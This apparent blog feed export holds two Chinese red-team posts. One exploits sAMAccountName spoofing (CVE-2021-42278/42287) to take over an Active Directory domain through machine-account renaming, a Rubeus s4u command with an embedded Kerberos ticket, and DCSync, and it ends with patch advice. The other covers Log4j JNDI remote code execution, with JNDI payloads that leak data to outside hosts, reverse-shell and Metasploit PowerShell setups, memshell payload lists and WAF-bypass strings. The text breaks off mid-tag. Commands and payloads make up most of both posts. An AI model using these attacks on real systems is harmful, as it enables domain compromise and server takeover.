      <url>2021/12/15/samaccountname-spoofing-li-yong-jian-dan-fen-xi-xiu-fu-fang-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">主要需要结合CVE-2021-42278、CVE-2020-42287进行利用Log4j为攻击者打出了外网的shell，SAMAccountNameSpoofing为攻击者打下了内网的域，网上文章资料也非常多，更多的还是围绕如何脚本化一键利用，真正能动手把利用&amp;修复原理过一遍的挺少....还是得有自己的思考，自己动手过一遍，踩踩坑CVE-2021-42278：机器用户名大部分以$为结尾，但AD没有对域内机器用户名进行验证，能够与42287结合利用从而实现模拟域控账户CVE-2021-42287：同78结合使用，创建与DC机器用户名相同的机器用户，不以$为结尾，账户请求一个TGT后更名账户，然后通过s4uself申请TGS凭证，在TGS REP-REQ阶段，这个账户不存在时，DC将使用自己的密钥加密TGS凭证，提供一个属于该账户的PAC，从而获得高权限ST根据kerberos认证流程，在域内请求ST凭证时，首先需要进行TGT的凭证，当KDC未找到请求的ST凭证时，KDC会自动搜索带$结尾的机器用户，如果获得了DC用户的TGT凭证，且有一台名为DC$的域控，再将DC用户删除，此时使用该TGT去请求s4u2self，如果域控账户DC$存在，那么DC就能获得DC$（机器用户）的ST凭证读到这里，相信你一定有了如何操作的想法了吧！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><pre class="line-numbers language-none"><code class="language-none">域内默认配置：有一个普通域用户普通域用户能够添加机器账户，如果machineaccountquota为0则没法添加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="属性查看"><a href="#属性查看" class="headerlink" title="属性查看"></a>属性查看</h3><pre class="line-numbers language-none"><code class="language-none">需要对samaccountname serviceprincipalname具备写权限，默认的ms-ds-machineaccountquota允许域账户创建10个机器账户，而创建者对于机器账户具有写权限那也就可以进行更改<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213141202424.png"></p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><pre class="line-numbers language-none"><code class="language-none">创建一个机器用户清楚他的spn属性将机器用户的samaccountname属性改为DC机器用户的名字，不带$【cve-2021-42278】为机器用户请求TGT将机器用户的samaccountname改为其他名字，只要不是域控的就行，也不加$利用先前的TGT通过s4uself协议向DC请求ST【cve-2021-42287】权限获取，dcsync即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h3><pre class="line-numbers language-none"><code class="language-none">添加机器用户New-MachineAccount -MachineAccount yangcom -Domain rootkit.org -DomainController owa2013.rootkit.org -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="pic/image-20211213210405646.png" alt="image-20211213210405646"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213210424639.png"></p><pre class="line-numbers language-none"><code class="language-none">清除spn，不清除spn也不会影响结果，很多的文章都说要清除spn，但是我这环境没有清楚spn竟然也就成功了......多实践少些人云亦云就好Set-DomainObject &quot;CN&#x3D;yangcom,CN&#x3D;Computers,DC&#x3D;attack,DC&#x3D;local&quot; -Clear &#39;serviceprincipalname&#39; -Verbose重新设置机器名Set-MachineAccountAttribute -MachineAccount yangcom -Value &quot;owa2013&quot; -Attribute samaccountname -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214105314414.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213210511276.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213210526840.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213213425500.png"></p><pre class="line-numbers language-none"><code class="language-none">请求TGT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213210838216.png"></p><pre class="line-numbers language-none"><code class="language-none">修改回其他名字，使得认证时候找不到<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213210916285.png"></p><pre class="line-numbers language-none"><code class="language-none">s4u2self获取凭证Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;nowrap &#x2F;dc:owa2013.rootkit.org &#x2F;self &#x2F;altservice:LDAP&#x2F;owa2013.rootkit.org &#x2F;ptt &#x2F;ticket:doIE4jCCBN6gAwIBBaEDAgEWooID+zCCA&#x2F;dhggPzMIID76ADAgEFoQ0bC1JPT1RLSVQuT1JHoiAwHqADAgECoRcwFRsGa3JidGd0Gwtyb290a2l0Lm9yZ6OCA7UwggOxoAMCARKhAwIBAqKCA6MEggOfNq0RSrA3mpyPRfKkDWzsQYf6NenAdK+3Y5pxqlabQu4PuELXCBJeKkKNFTZB+IhX3gm21LVfgeewP5FoGbE6fAi7TE0CxZVQPEERBG&#x2F;V0q1Kfgbqz6bh7loxU4BH6&#x2F;FSjdHgFtVyICuKoeu1LrT9Wg7fq35vEdsi4g9WTZufvW9EjKypc+DvSkA&#x2F;5cUE+6d8JSILEf9V3g5LkFZ2&#x2F;LbBs4pzIh6E&#x2F;s7RvJSrzcBFX0fx98YsyfqV&#x2F;gPpkCXErH7HEYKx&#x2F;YY6LuHlDm3DS3bjWj1yOm8LlDClHk0hcH6LOI&#x2F;xKr&#x2F;hb7atumHCjC6DTxoYLMz5ODeX+Rwqzt7jfCkdIvFOyjDhLPQed+8JCzRxz4U54GtHoLT12u&#x2F;qWMxiqPcFBNnwL8nGLIlCQcy4Og9QjIPt434RbxGDIR&#x2F;868lSschBDvlbbBA9cQ5&#x2F;e3FCUGrxt+kD+kbut0klDVh+0r94sdb4rh93&#x2F;dIBoeXPi00&#x2F;Um1nYCc779jUiTGeCdv&#x2F;k+6eYX6AGZbNhD749vHQSfhx0sRPgC0+rgDULCU7Ib+gU8yWGTMQUi+aYmjUhY&#x2F;p+P0YR6ZZ31I4qNCCgWHl3OC4NTp&#x2F;IIGrYDg1bUFtY3s3cZFpyCsbAC7pTIIIREvKUt2l5yc3&#x2F;hX44WhEZGN5ZlKJM9+Ow3ZPYNxyZYRsygupw7LRd3mQNauXJ2hBCm&#x2F;LsQ0fbJRHmHYS4i1Pg4IO6l&#x2F;bVP0oRpu9Pv2ER40OCfOri0f2am1Cko83usv12EPnht87P6NGL7leObbohNin&#x2F;iXCc9aggU9U6s9X+7TDkp+ux86R3uAH0LeUfApzHkjxgQMjnFDwXEgjlL4TfX7X1Z&#x2F;c5w4OCFHEJM1NEEuazZzRLQGHJBecbFxnA&#x2F;6W7XVqUnHycnboJfDnPD6B1ssSXbd4O+65jk9VzQAUuB1aVzTfWfaNrVmPHgt0CRjkS4uWhV0druFCYQPIA6W6ZKllZ2JsAohvlu88wS6GzzUhCZUuKIx50+1Fv3361GHux0PrwBipaF3Rgu3IyCJ8PoUXegd9ClUoJ+ro2cUUmDE7PvgTi5iWGPXs+Ei102mtNIXOofCniUXehxIvpsaFFud9QpLw494wYLo&#x2F;ljleT8ChdY9Use6guiSU53kX4M11AWRnI4BMUruzRDi4d3UfdRrjk8ykIMu&#x2F;BT+hscuti0LaARWYEv7TwmMrgqYSQ1ySJrcHe5qEg6v0yUF+o4f7dzKtfnQ9o4HSMIHPoAMCAQCigccEgcR9gcEwgb6ggbswgbgwgbWgGzAZoAMCARehEgQQ7AL7a7q9So2J+dg6O5W0rKENGwtST09US0lULk9SR6IUMBKgAwIBAaELMAkbB293YTIwMTOjBwMFAEDhAAClERgPMjAyMTEyMTMxMzA4MTJaphEYDzIwMjExMjEzMjMwODEyWqcRGA8yMDIxMTIyMDEzMDgxMlqoDRsLUk9PVEtJVC5PUkepIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3Jvb3RraXQub3Jn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213211109810.png" alt="image-20211213211109810"></p><pre class="line-numbers language-none"><code class="language-none">有了权限凭证，dcsync即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213211435616.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213211522962.png"></p><h3 id="一键化"><a href="#一键化" class="headerlink" title="一键化"></a>一键化</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-none"><code class="language-none">python3 exp.py &quot;rootkit.org&#x2F;yangsir:Aa123456&quot; -dc-ip 192.168.3.144 -shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213220845131.png"></p><h4 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h4><pre class="line-numbers language-none"><code class="language-none">检测<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213221256922.png"></p><pre class="line-numbers language-none"><code class="language-none">直接利用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211213221452259.png"></p><pre class="line-numbers language-none"><code class="language-none">dcsync即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214100930227.png" alt="image-20211214100930227"></p><pre class="line-numbers language-none"><code class="language-none">注意此处默认模拟的用户是administrator，如果不存在的用户ptt后其实是没权限的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214100125047.png"></p><h4 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-none"><code class="language-none">检测<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214091909617.png"></p><pre class="line-numbers language-none"><code class="language-none">利用，因为上面的那个py脚本暂时只能在kali打，于是乎为了macshell，又找了个如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214092222012.png"></p><pre class="line-numbers language-none"><code class="language-none">dcsync同理可行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/image-20211214104324944.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><pre class="line-numbers language-none"><code class="language-none">除了针对两个cve打补丁外【KB5008602、KB5008380】，可将ms-ds-machineaccountquota设置为0，以此阻止低权限用户创建机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/1.png"></p><pre class="line-numbers language-none"><code class="language-none">SeMachineAccountPrivilege属性内删除Authenticated Users，添加为域管或其他特定组成员<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/sAMAccountName%20spoofing/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> Mimikatz </tag>
            
            <tag> RCE </tag>
            
            <tag> CVE-2021-42278 </tag>
            
            <tag> CVE-2021-42287 </tag>
            
            <tag> SAMAccountName Spoofing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j JNDI RCE利用&amp;简单分析</title>
      <link href="2021/12/15/log4j-jndi-rce-li-yong-jian-dan-fen-xi/"/>
      <url>2021/12/15/log4j-jndi-rce-li-yong-jian-dan-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="务必遵循网络安全法，用于非法目的于本人无关，文章仅限java代码学习使用，所有环境为本人本地环境"><a href="#务必遵循网络安全法，用于非法目的于本人无关，文章仅限java代码学习使用，所有环境为本人本地环境" class="headerlink" title="务必遵循网络安全法，用于非法目的于本人无关，文章仅限java代码学习使用，所有环境为本人本地环境"></a>务必遵循网络安全法，用于非法目的于本人无关，文章仅限java代码学习使用，所有环境为本人本地环境</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">总结相关利用方式，含mac、window、linux环境常用方法，简单分析、学习相关漏洞原理实现，主要还是觉得一键化利用太脚本了，还是得自己起下java学着分析下才能真正有所进步Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码利用流程：jndi的恶意代码输入目标页面&#x3D;》java项目&#x3D;》记录log&#x3D;》触发lookup&#x3D;》触发jndi&#x3D;》通过不同的协议访访问远程的恶意站点&#x3D;》加载恶意的类&#x3D;》命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><pre class="line-numbers language-none"><code class="language-none">dnslog回显<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215090930518.png"></p><pre class="line-numbers language-none"><code class="language-none">更多的版本判断方法$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;env:JAVA_VERSION&#125;.20d239a3.dns.1433.eu.org&#125;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.vendor&#125;.@.$&#123;sys:java.version&#125;.@.$&#123;hostName&#125;.6e0da007.dns.1433.eu.org&#125;$&#123;jndi:ldap:&#x2F;&#x2F;192.168.122.38:1389&#x2F;$&#123;java:version&#125;&#125;echo -e &#39;0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00&#39; | nc -vv -l -p 1389 | xxd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215091318620.png"></p><h3 id="命令执行（linux-windows）"><a href="#命令执行（linux-windows）" class="headerlink" title="命令执行（linux+windows）"></a>命令执行（linux+windows）</h3><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><pre class="line-numbers language-none"><code class="language-none">此处执行命令进行反弹shelljava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;base64后的命令&quot; -A &quot;XXXX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/iShot1.png"></p><pre class="line-numbers language-none"><code class="language-none">生成payload如下----------------------------JNDI Links---------------------------- Target environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi:&#x2F;&#x2F;XXXXXXXXXX&#x2F;a4s2ncldap:&#x2F;&#x2F;XXXXXXXXXX&#x2F;a4s2ncTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi:&#x2F;&#x2F;XXXXXXXXXX&#x2F;gehevlTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi:&#x2F;&#x2F;XXXXXXXXXX&#x2F;baygzrldap:&#x2F;&#x2F;XXXXXXXXXX&#x2F;baygzr利用中ldap、rmi均可尝试，获取到shell如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215095811438.png"></p><h4 id="windos"><a href="#windos" class="headerlink" title="windos"></a>windos</h4><pre class="line-numbers language-none"><code class="language-none">进行计算器弹窗，此处和linux一样，改下命令就行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/iShot2.png"></p><pre class="line-numbers language-none"><code class="language-none">执行后效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215133652739.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">或可利用如下尝试上线use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> payload payload/windows/x64/powershell_reverse_tcp<span class="token builtin class-name">set</span> target <span class="token number">2</span>runmsf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> options Module options <span class="token punctuation">(</span>exploit/multi/script/web_delivery<span class="token punctuation">)</span>:   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> <span class="token function">host</span> or network interface to listen on. This must be an address on the <span class="token builtin class-name">local</span> machine or                                        <span class="token number">0.0</span>.0.0 to listen on all addresses.   SRVPORT  <span class="token number">8080</span>             <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> port to listen on.   SSL      <span class="token boolean">false</span>            no        Negotiate SSL <span class="token keyword">for</span> incoming connections   SSLCert                   no        Path to a custom SSL certificate <span class="token punctuation">(</span>default is randomly generated<span class="token punctuation">)</span>   URIPATH                   no        The URI to use <span class="token keyword">for</span> this exploit <span class="token punctuation">(</span>default is random<span class="token punctuation">)</span>Payload options <span class="token punctuation">(</span>windows/x64/powershell_reverse_tcp<span class="token punctuation">)</span>:   Name          Current Setting  Required  Description   ----          ---------------  --------  -----------   EXITFUNC      process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>   LHOST                          <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web   LPORT         <span class="token number">13390</span>            <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">2</span>   PSH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215132723566.png"></p><h3 id="反弹shell（linux）"><a href="#反弹shell（linux）" class="headerlink" title="反弹shell（linux）"></a>反弹shell（linux）</h3><pre class="line-numbers language-none"><code class="language-none">可用payload如下[+] Basic Queries: ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;[PayloadType]&#x2F;[Params], e.g.    ldap:&#x2F;&#x2F;null:13891&#x2F;Basic&#x2F;Dnslog&#x2F;[domain]    ldap:&#x2F;&#x2F;null:13891&#x2F;Basic&#x2F;Command&#x2F;whoami    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;Command&#x2F;Base64&#x2F;[base64_encoded_cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;[ip]&#x2F;[port]  ---windows NOT supported    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;TomcatEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;SpringEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;WeblogicEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;TomcatMemshell1    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;TomcatMemshell2  ---need extra header [shell: true]    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;JettyMemshell    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;WeblogicMemshell1    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;WeblogicMemshell2    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;JBossMemshell    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;WebsphereMemshell    ldap:&#x2F;&#x2F;null:1389&#x2F;Basic&#x2F;SpringMemshell[+] Deserialize Queries: ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;[GadgetType]&#x2F;[PayloadType]&#x2F;[Params], e.g.    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;URLDNS&#x2F;[domain]    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CommonsCollectionsK1&#x2F;Dnslog&#x2F;[domain]    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CommonsCollectionsK2&#x2F;Command&#x2F;Base64&#x2F;[base64_encoded_cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CommonsBeanutils1&#x2F;ReverseShell&#x2F;[ip]&#x2F;[port]  ---windows NOT supported    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CommonsBeanutils2&#x2F;TomcatEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;C3P0&#x2F;SpringEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;Jdk7u21&#x2F;WeblogicEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;Jre8u20&#x2F;TomcatMemshell    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CVE_2020_2555&#x2F;WeblogicMemshell1    ldap:&#x2F;&#x2F;null:1389&#x2F;Deserialization&#x2F;CVE_2020_2883&#x2F;WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;Dnslog&#x2F;[domain]    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;[cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;[base64_encoded_cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;ReverseShell&#x2F;[ip]&#x2F;[port]  ---windows NOT supported    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;TomcatEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;SpringEcho    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;TomcatMemshell1    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;TomcatMemshell2  ---need extra header [shell: true]    ldap:&#x2F;&#x2F;null:1389&#x2F;TomcatBypass&#x2F;SpringMemshell[+] GroovyBypass Queries    ldap:&#x2F;&#x2F;null:1389&#x2F;GroovyBypass&#x2F;Command&#x2F;[cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;GroovyBypass&#x2F;Command&#x2F;Base64&#x2F;[base64_encoded_cmd][+] WebsphereBypass Queries    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;List&#x2F;file&#x3D;[file or directory]    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;Upload&#x2F;Dnslog&#x2F;[domain]    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;Upload&#x2F;Command&#x2F;[cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;Upload&#x2F;Command&#x2F;Base64&#x2F;[base64_encoded_cmd]    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;Upload&#x2F;ReverseShell&#x2F;[ip]&#x2F;[port]  ---windows NOT supported    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;Upload&#x2F;WebsphereMemshell    ldap:&#x2F;&#x2F;null:1389&#x2F;WebsphereBypass&#x2F;RCE&#x2F;path&#x3D;[uploaded_jar_path]   ----e.g: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;jar_cache7808167489549525095.tmp    启动服务如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215100551548.png"></p><pre class="line-numbers language-none"><code class="language-none">实际反弹shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215100729596.png"></p><pre class="line-numbers language-none"><code class="language-none">效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215100856985.png"></p><h3 id="tomcat回显"><a href="#tomcat回显" class="headerlink" title="tomcat回显"></a>tomcat回显</h3><pre class="line-numbers language-none"><code class="language-none">利用tomcatecho即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215104133041.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/log4j-rcevuln/image-20211215104153880.png"></p><h3 id="基本waf绕过"><a href="#基本waf绕过" class="headerlink" title="基本waf绕过"></a>基本waf绕过</h3><pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F; badClassName&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:&#x2F;&#x2F;asdasd.asdasd.asdasd&#x2F;poc&#125;$&#123;$&#123;::-j&#125;ndi:ldap:&#x2F;&#x2F;asdasd.asdasd.asdasd&#x2F;ass&#125;$&#123;jndi:ldap:&#x2F;&#x2F;adsasd.asdasd.asdasd&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:ldap&#125;:&#x2F;&#x2F;adsasd.asdasd.asdasd&#x2F;poc&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:ldap&#125;:&#x2F;&#x2F;adsasd.asdasd.asdasd&#x2F;poc&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:ldap&#125;:&#x2F;&#x2F;adsasd.asdasd.asdasd&#x2F;poc&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:&#x2F;&#x2F;xxxxxxx.xx&#x2F;poc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="jar包复现"><a href="#jar包复现" class="headerlink" title="jar包复现"></a>jar包复现</h2><h3 id="dnslog回显"><a href="#dnslog回显" class="headerlink" 